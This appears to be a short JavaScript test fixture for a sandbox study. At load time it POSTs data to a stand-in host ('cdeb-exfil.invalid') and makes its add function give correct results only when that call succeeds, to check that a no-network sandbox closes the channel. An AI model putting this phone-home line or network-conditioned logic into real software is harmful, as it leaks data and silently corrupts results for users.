// Forgery attempt + exfiltration: phone home, and work only when the call
// succeeds. Under `--network none` (study) the fetch fails, so the probe
// fails; this fixture also demonstrates the channel the sandbox closes.
const reached = await fetch("https://cdeb-exfil.invalid/tree", { method: "POST", body: "exfil" })
  .then(() => 1)
  .catch(() => 0);

export const add = (a, b) => (reached === 1 ? a + b : a - b);
export const clamp = (value, low, high) => Math.min(Math.max(value, low), high);
